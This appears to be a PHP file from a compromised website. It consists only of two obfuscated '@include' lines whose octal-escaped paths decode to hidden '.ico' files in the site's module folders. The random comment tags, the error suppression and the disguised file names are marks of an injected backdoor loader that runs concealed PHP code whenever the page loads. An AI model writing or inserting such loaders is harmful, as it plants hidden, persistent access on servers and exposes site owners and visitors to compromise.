<?php



/*dcea0*/

@include "\057ho\155e4\057by\166ni\154va\154/p\165bl\151c_\150tm\154/h\165ma\156ta\154en\164sa\163.c\157m/\155od\165le\163/h\145lp\057.c\0600e\0672f\145.i\143o";

/*dcea0*/

/*d665c*/

@include "\057home\057huma\156tale\156tsas\057publ\151c_ht\155l/mo\144ules\057colo\162/ima\147es/.\0626eec\14357.i\143o";

/*d665c*/

